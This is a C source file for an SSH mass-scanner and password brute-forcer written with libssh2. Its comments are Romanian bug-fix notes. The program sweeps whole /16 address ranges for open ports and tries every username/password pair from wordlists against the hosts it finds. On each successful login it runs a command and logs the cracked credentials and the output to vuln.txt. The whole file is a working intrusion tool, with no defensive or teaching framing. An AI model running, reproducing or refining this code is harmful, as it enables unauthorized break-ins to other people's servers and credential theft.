#define LIBSSH2_STATIC 1
#include "libssh2_config.h"
#include <libssh2.h>
#ifdef HAVE_WINSOCK2_H
# include <winsock2.h>
#endif
#ifdef HAVE_SYS_SOCKET_H
# include <sys/socket.h>
#endif
#ifdef HAVE_NETINET_IN_H
# include <netinet/in.h>
#endif
#ifdef HAVE_SYS_SELECT_H
# include <sys/select.h>
#endif
#ifdef HAVE_UNISTD_H
# include <unistd.h>
#endif
#ifdef HAVE_ARPA_INET_H
# include <arpa/inet.h>
#endif
#include <sys/time.h>
#include <sys/types.h>
#include <sys/file.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdio.h>
#include <ctype.h>
#include <netdb.h>
#include <time.h>

#define TOTAL_VAL_COUNT   254
#define MAX_SOCKETS       1000
#define TIMEOUT           3
#define S_NONE            0
#define S_CONNECTING      1
#define _FILE_OFFSET_BITS 64
#define EOL               '\n'
#define CAR_RETURN        '\r'

struct conn_t {
    int s;
    char status;
    time_t a;
    struct sockaddr_in addr;
};
static struct conn_t connlist[MAX_SOCKETS];
static FILE *outfd = NULL;
static int   tot   = 0;

/* FIX #6: snprintf cu bounds explicite in loc de sprintf */
static char *replace_str(const char *str, const char *orig, const char *rep)
{
    static char buffer[4096];
    const char *p;
    if (!(p = strstr(str, orig)))
        return (char *)str;
    size_t prefix_len = (size_t)(p - str);
    strncpy(buffer, str, prefix_len);
    buffer[prefix_len] = '\0';
    snprintf(buffer + prefix_len, sizeof(buffer) - prefix_len,
             "%s%s", rep, p + strlen(orig));
    return buffer;
}

static void init_sockets(void)
{
    int i;
    for (i = 0; i < MAX_SOCKETS; i++) {
        connlist[i].status = S_NONE;
        memset(&connlist[i].addr, 0, sizeof(struct sockaddr_in));
    }
}

static void fatal(const char *err)
{
    int i;
    fprintf(stderr, "Error: %s\n", err);
    for (i = 0; i < MAX_SOCKETS; i++)
        if (connlist[i].status >= S_CONNECTING)
            close(connlist[i].s);
    if (outfd) fclose(outfd);
    exit(EXIT_FAILURE);
}

static void check_sockets(void)
{
    int i, ret;
    for (i = 0; i < MAX_SOCKETS; i++) {
        if (connlist[i].status != S_CONNECTING) continue;
        if (connlist[i].a < (time(NULL) - TIMEOUT)) {
            close(connlist[i].s);
            connlist[i].status = S_NONE;
            continue;
        }
        ret = connect(connlist[i].s, (struct sockaddr *)&connlist[i].addr,
                      sizeof(struct sockaddr_in));
        if (ret == -1) {
            if (errno == EISCONN) {
                tot++;
                fprintf(outfd, "%s\n", inet_ntoa(connlist[i].addr.sin_addr));
                close(connlist[i].s);
                connlist[i].status = S_NONE;
            } else if (errno != EALREADY && errno != EINPROGRESS) {
                close(connlist[i].s);
                connlist[i].status = S_NONE;
            }
        } else {
            tot++;
            fprintf(outfd, "%s\n", inet_ntoa(connlist[i].addr.sin_addr));
            close(connlist[i].s);
            connlist[i].status = S_NONE;
        }
    }
}

static int waitsocket(int socket_fd, LIBSSH2_SESSION *session)
{
    struct timeval timeout;
    fd_set fd;
    fd_set *writefd = NULL;
    fd_set *readfd  = NULL;
    int dir;
    timeout.tv_sec  = 2;
    timeout.tv_usec = 0;
    FD_ZERO(&fd);
    FD_SET(socket_fd, &fd);
    dir = libssh2_session_block_directions(session);
    if (dir & LIBSSH2_SESSION_BLOCK_INBOUND)  readfd  = &fd;
    if (dir & LIBSSH2_SESSION_BLOCK_OUTBOUND) writefd = &fd;
    return select(socket_fd + 1, readfd, writefd, NULL, &timeout);
}

/* FIX #1: libssh2_init/exit eliminate din checkauth — apelate global in main()
   FIX #2: hostname nu mai este modificat cu strtok()
   FIX #3: cod mort eliminat (bucla for dupa goto)
   FIX #4: bloc "var = var" eliminat
   FIX #11: INADDR_NONE in loc de -1 */
static int checkauth(const char *username, const char *password,
                     const char *hostname,  const char *portar,
                     const char *command)
{
    unsigned long hostaddr;
    int sock, port, rc;
    struct sockaddr_in sin;
    LIBSSH2_SESSION *session = NULL;
    LIBSSH2_CHANNEL *channel = NULL;
    struct timeval timeout;
    int bytecount = 0;
    FILE *vulnf;

    timeout.tv_sec  = 10;
    timeout.tv_usec = 0;
    port = atoi(portar);

    hostaddr = inet_addr(hostname);
    if (hostaddr == INADDR_NONE) return -1;   /* FIX #11 */

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO,
                   (char *)&timeout, sizeof(timeout)) < 0 ||
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO,
                   (char *)&timeout, sizeof(timeout)) < 0) {
        close(sock); return -1;
    }

    memset(&sin, 0, sizeof(sin));
    sin.sin_family      = AF_INET;
    sin.sin_port        = htons(port);
    sin.sin_addr.s_addr = hostaddr;

    if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != 0) {
        close(sock); return -1;
    }

    session = libssh2_session_init();
    if (!session) { close(sock); return -1; }

    libssh2_session_set_timeout(session, 15000L);

    while ((rc = libssh2_session_handshake(session, sock)) ==
           LIBSSH2_ERROR_EAGAIN);
    if (rc) goto shutdown;

    while ((rc = libssh2_userauth_password(session, username, password)) ==
           LIBSSH2_ERROR_EAGAIN);
    if (rc) goto shutdown;

    while ((channel = libssh2_channel_open_session(session)) == NULL &&
           libssh2_session_last_error(session, NULL, NULL, 0) ==
           LIBSSH2_ERROR_EAGAIN)
        waitsocket(sock, session);
    if (!channel) goto shutdown;

    while ((rc = libssh2_channel_exec(channel, command)) ==
           LIBSSH2_ERROR_EAGAIN)
        waitsocket(sock, session);
    if (rc != 0) goto shutdown;

    for (;;) {
        char buffer[65535];
        rc = libssh2_channel_read(channel, buffer, sizeof(buffer) - 1);
        if (rc > 0) {
            buffer[rc] = '\0';
            bytecount += rc;
            /* FIX #2: hostname curat — trim facut in scan() inainte de fork() */
            fprintf(stderr, "[*] WOW   : %s:%s %s port: %s\n",
                    username, password, hostname, portar);
            fprintf(stderr, "[*] Kernel: %s\n", buffer);
            vulnf = fopen("vuln.txt", "a");
            if (vulnf) {
                flock(fileno(vulnf), LOCK_EX);
                fprintf(vulnf, "%s:%s %s port: %s --> %s\n",
                        username, password, hostname, portar, buffer);
                flock(fileno(vulnf), LOCK_UN);
                fclose(vulnf);
            }
            /* FIX #3: cod mort (bucla for dupa goto) eliminat */
            goto shutdown;
        } else if (rc == LIBSSH2_ERROR_EAGAIN) {
            waitsocket(sock, session);
        } else {
            break;
        }
    }
    /* FIX #4: bloc "var = var" eliminat complet */

    if (channel) {
        while ((rc = libssh2_channel_close(channel)) == LIBSSH2_ERROR_EAGAIN)
            waitsocket(sock, session);
        libssh2_channel_free(channel);
        channel = NULL;
    }

shutdown:
    if (channel)  libssh2_channel_free(channel);
    if (session) {
        libssh2_session_disconnect(session, "Normal Shutdown");
        libssh2_session_free(session);
    }
    close(sock);
    /* FIX #1: libssh2_exit() eliminat — apelat o singura data in main() */
    return 0;
}

/* FIX #7: format string corectat — bclass si port in numele fisierului
   FIX #8: printf corectat — bclass afisat efectiv
   FIX #11: INADDR_NONE in loc de -1 */
static int scanbclass(const char *bclass, const char *port)
{
    int done = 0, i, cip = 1, bb = 0, ret, k, ns, x;
    time_t scantime;
    char ip[20], outfile[128], last[256];

    unlink("scan.log");
    memset(outfile, 0, sizeof(outfile));
    /* FIX #7 */
    snprintf(outfile, sizeof(outfile) - 1, "scan_%s_%s.log", bclass, port);

    if (!(outfd = fopen(outfile, "a"))) { perror(outfile); exit(EXIT_FAILURE); }

    /* FIX #8 */
    printf("[-] Searching: %s.*.*\n", bclass);
    fflush(stdout);

    memset(last, 0, sizeof(last));
    init_sockets();
    scantime = time(NULL);

    while (!done) {
        for (i = 0; i < MAX_SOCKETS; i++) {
            if (cip == 255) {
                if (bb == 255) {
                    ns = 0;
                    for (k = 0; k < MAX_SOCKETS; k++)
                        if (connlist[k].status > S_NONE) { ns++; break; }
                    if (ns == 0) done = 1;
                    break;
                } else {
                    cip = 0; bb++;
                    for (x = 0; x < (int)strlen(last); x++) putchar('\b');
                    memset(last, 0, sizeof(last));
                    snprintf(last, sizeof(last) - 1,
                             "%s.%d.* on port: %s [Found: %d] [%.1f%% Done]",
                             bclass, bb, port, tot, (bb / 255.0) * 100);
                    printf("%s", last);
                    fflush(stdout);
                }
            }
            if (connlist[i].status == S_NONE) {
                connlist[i].s = socket(AF_INET, SOCK_STREAM, 0);
                if (connlist[i].s == -1) {
                    fprintf(stderr, "Unable to allocate socket.\n");
                } else {
                    ret = fcntl(connlist[i].s, F_SETFL, O_NONBLOCK);
                    if (ret == -1) {
                        fprintf(stderr, "Unable to set O_NONBLOCK\n");
                        close(connlist[i].s);
                    } else {
                        memset(ip, 0, sizeof(ip));
                        snprintf(ip, sizeof(ip) - 1, "%s.%d.%d", bclass, bb, cip);
                        connlist[i].addr.sin_addr.s_addr = inet_addr(ip);
                        if (connlist[i].addr.sin_addr.s_addr == INADDR_NONE) /* FIX #11 */
                            fatal("Invalid IP.");
                        connlist[i].addr.sin_family = AF_INET;
                        connlist[i].addr.sin_port   = htons(atoi(port));
                        connlist[i].a               = time(NULL);
                        connlist[i].status          = S_CONNECTING;
                        cip++;
                    }
                }
            }
        }
        check_sockets();
        usleep(1000);
    }

    printf("\n[!] Scanning complete in %u seconds. [Found %d IPs]\n",
           (unsigned int)(time(NULL) - scantime), tot);
    fclose(outfd);
    outfd = NULL;
    return 1;
}

/* FIX #2: trim newline in buff inainte de fork
   FIX #5: free(user)/free(pass) la sfarsitul fiecarei iteratii
   FIX #14: numforks local si initializat explicit
   FIX #17: recolectare zombie la final */
static int scan(const char *thr, const char *ipfile,
                const char *userfile, const char *passfile,
                const char *portar,   const char *commandline)
{
    int numforks = 0, maxf, status; /* FIX #14 */
    FILE *fp, *passf, *userf;
    char buff[4096], nutt2[4096], nutt[4096];
    char *pass, *user, *ns;
    pid_t PID;

    maxf = atoi(thr);
    if (maxf < 1) maxf = 1;

    if ((userf = fopen(userfile, "r")) == NULL) {
        fprintf(stderr, "FATAL: Cannot open %s\n", userfile); return -1;
    }

    while (fgets(nutt2, sizeof(nutt2), userf)) {
        user = strdup(nutt2);
        if (!user) continue;
        user[strcspn(user, "\r\n")] = '\0'; /* FIX #2 */

        if ((passf = fopen(passfile, "r")) == NULL) {
            fprintf(stderr, "FATAL: Cannot open %s\n", passfile);
            free(user); fclose(userf); return -1;
        }

        while (fgets(nutt, sizeof(nutt), passf)) {
            pass = strdup(nutt);
            if (!pass) continue;
            pass[strcspn(pass, "\r\n")] = '\0'; /* FIX #2 */

            ns = replace_str(pass, "$user", user);
            printf("[*] Trying: %s:%s on found IPs\n", user, ns);

            if ((fp = fopen(ipfile, "r")) == NULL) {
                fprintf(stderr, "FATAL: Cannot open %s\n", ipfile);
                free(pass); free(user); fclose(passf); fclose(userf); return -1;
            }

            while (fgets(buff, sizeof(buff), fp)) {
                buff[strcspn(buff, "\r\n")] = '\0'; /* FIX #2 */
                if (buff[0] == '\0') continue;

                PID = fork();
                if (PID < 0) {
                    fprintf(stderr, "[!] Couldn't fork!\n");
                    free(pass); free(user);
                    fclose(fp); fclose(passf); fclose(userf);
                    return -1;
                }
                if (PID == 0) {
                    checkauth(user, ns, buff, portar, commandline);
                    exit(0);
                } else {
                    numforks++;
                    if (numforks >= maxf) { /* FIX #5: wait corect */
                        wait(&status);
                        numforks--;
                    }
                }
            }
            fclose(fp);
            free(pass); /* FIX #5 */
        }
        fclose(passf);
        free(user); /* FIX #5 */
    }
    fclose(userf);

    while (numforks > 0) { wait(&status); numforks--; } /* FIX #17 */
    return 0;
}

/* FIX #1: libssh2_init/exit o singura data in main()
   FIX #9: bounds check pe argv[i+1]
   FIX #10: verificare NULL inainte de atoi()
   FIX #17: SA_NOCLDWAIT */
int main(int argc, char *argv[])
{
    int i, input = 0;
    FILE *fcheck, *userf, *passf;
    char *userfile = NULL, *passfile = NULL, *command  = NULL;
    char *threads  = NULL, *scanfile = NULL, *bclass   = NULL, *port = NULL;

    if (argc < 3) {
        printf("Usage:\n");
        printf("  %s -f ip.lst -user u.lst -pass p.lst -p 22 -t 10 -c \"uname -a\"\n", argv[0]);
        printf("  %s -b 10.10  -user u.lst -pass p.lst -p 22 -t 10 -c \"uname -a\"\n", argv[0]);
        return 1;
    }

    /* FIX #9: i < argc - 1 */
    for (i = 1; i < argc - 1; i++) {
        if (strcmp(argv[i], "-p")    == 0) port     = argv[i+1];
        if (strcmp(argv[i], "-user") == 0) userfile = argv[i+1];
        if (strcmp(argv[i], "-pass") == 0) passfile = argv[i+1];
        if (strcmp(argv[i], "-t")    == 0) threads  = argv[i+1];
        if (strcmp(argv[i], "-c")    == 0) command  = argv[i+1];
    }

    if (strcmp(argv[1], "-f") == 0) input = 1;
    if (strcmp(argv[1], "-b") == 0) input = 4;

    /* FIX #10: validare completa inainte de atoi() */
    if (input == 1 || input == 4) {
        if (!threads || atoi(threads) < 1) {
            fprintf(stderr, "FATAL: -t lipseste sau invalid\n"); return 1;
        }
        if (!port || atoi(port) <= 2) {
            fprintf(stderr, "FATAL: -p lipseste sau invalid\n"); return 1;
        }
        if (!userfile || !passfile || !command) {
            fprintf(stderr, "FATAL: -user, -pass, -c obligatorii\n"); return 1;
        }
        if ((userf = fopen(userfile, "r")) == NULL) {
            fprintf(stderr, "FATAL: Cannot open %s\n", userfile); return 1;
        }
        fclose(userf);
        if ((passf = fopen(passfile, "r")) == NULL) {
            fprintf(stderr, "FATAL: Cannot open %s\n", passfile); return 1;
        }
        fclose(passf);
    }

    /* FIX #1: o singura data, inainte de orice fork */
    if (libssh2_init(0) != 0) {
        fprintf(stderr, "FATAL: libssh2_init failed\n"); return 1;
    }

    /* FIX #17: previne zombie */
    {
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = SIG_DFL;
        sa.sa_flags   = SA_NOCLDWAIT;
        sigaction(SIGCHLD, &sa, NULL);
    }

    switch (input) {
        case 1:
            scanfile = argv[2];
            if ((fcheck = fopen(scanfile, "r")) == NULL) {
                fprintf(stderr, "FATAL: Cannot open %s\n", scanfile);
                libssh2_exit(); return 1;
            }
            fclose(fcheck);
            scan(threads, scanfile, userfile, passfile, port, command);
            break;

        case 4: {
            char logname[128];
            bclass = argv[2];
            scanbclass(bclass, port);
            /* FIX #7: acelasi nume de fisier generat de scanbclass */
            snprintf(logname, sizeof(logname) - 1,
                     "scan_%s_%s.log", bclass, port);
            scan(threads, logname, userfile, passfile, port, command);
            break;
        }

        default:
            fprintf(stderr, "Bad command, quitting!\n");
            libssh2_exit();
            return 1;
    }

    /* FIX #1: o singura data, la sfarsitul main() */
    libssh2_exit();
    return 0;
}